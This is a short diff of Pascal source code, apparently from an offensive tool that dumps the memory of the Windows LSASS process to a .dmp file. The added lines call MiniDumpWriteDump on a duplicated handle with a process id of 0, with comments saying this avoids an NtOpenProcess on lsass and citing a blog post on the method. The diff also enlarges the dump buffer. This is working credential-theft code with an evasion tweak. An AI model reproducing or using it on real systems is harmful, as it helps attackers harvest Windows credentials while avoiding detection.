@@ -282,7 +282,10 @@ if processHandle<>thandle(-1) then
       begin
       hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
-      result := MiniDumpWriteDump(clone, pid, hfile, MiniDumpWithFullMemory, nil, nil, nil);
+      //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
+      //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
+      result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, nil);
+      if result=false then result := MiniDumpWriteDump(clone, pid, hfile, MiniDumpWithFullMemory, nil, nil, nil);
       if result=false
          then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)))
          else log(inttostr(pid)+'.dmp'+ ' written',1);
@@ -379,7 +382,7 @@ if processHandle<>thandle(-1) then
       	callbackInfo.CallbackRoutine := minidumpCallback;
       	callbackInfo.CallbackParam := nil;
       //
-      dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 128);
+      dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 256);
       log('calling MiniDumpWriteDump');
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
       //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
